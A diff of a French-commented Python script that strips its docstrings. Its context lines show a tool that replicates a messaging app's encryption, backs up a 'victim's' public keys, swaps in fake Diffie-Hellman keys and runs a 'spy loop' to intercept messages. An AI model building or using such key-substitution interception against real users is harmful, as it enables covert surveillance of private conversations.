@@ -32,7 +32,6 @@ DH_P = int(DH_MODULUS_HEX, 16)
 DH_G = 2
 
 class CryptoReplica:
-    """Réplique la logique cryptographique de l'application cliente"""
     
     @staticmethod
     def generate_dh_keypair():
@@ -60,7 +59,6 @@ class CryptoReplica:
 
     @staticmethod
     def aes_decrypt(ciphertext_b64, nonce_b64, auth_tag_b64, key):
-        """Déchiffre le message AES-GCM"""
         try:
             ciphertext = base64.b64decode(ciphertext_b64)
             nonce = base64.b64decode(nonce_b64)
@@ -76,7 +74,6 @@ class CryptoReplica:
 
     @staticmethod
     def generate_rsa_keypair():
-        """Génère une paire de clés RSA factice (non utilisée pour le déchiffrement DH mais requise par le protocole)"""
         
         key = rsa.generate_private_key(
             public_exponent=65537,
@@ -106,7 +103,6 @@ FAKE_DH_PRIVATE = None
 STOP_EVENT = threading.Event()
 
 def backup_keys(user):
-    """Sauvegarde les clés originales de la victime"""
     return {
         'rsa': user.rsa_public_key,
         'dh': user.dh_public_key
@@ -166,7 +162,6 @@ def restore_target(app):
         TARGET_USERNAME = None
 
 def spy_loop(app):
-    """Boucle d'espionnage pour intercepter les messages"""
     last_check = 0
     seen_messages = set()
     
